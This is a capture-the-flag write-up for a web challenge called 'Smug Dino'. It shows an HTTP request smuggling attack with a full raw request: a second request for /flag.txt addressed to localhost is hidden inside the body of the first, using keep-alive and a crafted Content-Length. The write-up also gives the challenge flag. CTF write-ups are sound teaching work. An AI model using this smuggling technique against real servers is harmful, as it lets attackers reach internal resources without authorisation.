# Smug Dino

Given a page where we can access home, hint, and flag? page

if we access flag? page, we will be redirected to localhost:3009/flag.txt, which is not available. 

![Alt text](imgs/image1.png) 

From here, i believe what we need to do is a request smuggling, to confirm it, we can access the hint page and insert the server and it's version. Which give us a clue to a CVE report:

![Alt text](imgs/image2.png)

So i open my burpsuite to intercept the request and modify it. We intercept the request, send it to the repeater and play with the request.

Set the connection to 

``Connection: keep-alive``

and modify the body to a new HTTP request to /flag but the host is locahost

```
GET /flag HTTP/1.1
Host: web.csaw.io:3009
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web.csaw.io:3009/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NDg2OTI1NSwianRpIjoiNTBkMWY0OWQtYTkwMC00NWMwLWIwZTUtMWFiZDg2NjM4MTRkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRqdW1AdXNlci5uZXQiLCJuYmYiOjE2OTQ4NjkyNTUsImV4cCI6MTY5NDg3MDE1NSwibWVtYmVyIjpmYWxzZX0.1qrON61s6GhP1d0dLEufowz4l5SroQ9iPBZn64P0OXA; connect.sid=s%3AMz4zbFYfXVaDdn0LurRfwxRbcmbWHHdy.%2F7G8VM3HrudBd5eSWJuejyVd74Ef9mtPcKEimOaQkhE
Connection: keep-alive
Content-Length: 43

GET /flag.txt HTTP/1.1
Host: localhost
```
we'll get this response:

![Alt text](imgs/image3.png) 

<h3>Flag: <i>csawctf{d0nt_smuggl3_Fla6s_!}</i></h3>

